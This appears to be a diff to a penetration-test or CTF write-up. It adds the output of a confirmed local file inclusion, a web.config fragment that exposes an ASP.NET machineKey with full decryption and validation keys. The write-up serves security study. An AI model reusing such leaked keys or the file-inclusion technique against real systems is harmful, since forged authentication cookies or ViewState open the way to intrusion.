@@ -511,5 +511,14 @@ Ill move this request to replay in caido to try and get LFI
 I have confirmed LFI
 
 ```python
-
+    <system.web>
+        <compilation targetFramework="4.8" />
+        <authentication mode="Forms">
+            <forms protection="All" loginUrl="/Login" path="/" />
+        </authentication>
+        <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
+        <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
+        <customErrors mode="Off" />
+    </system.web>
 ```
+
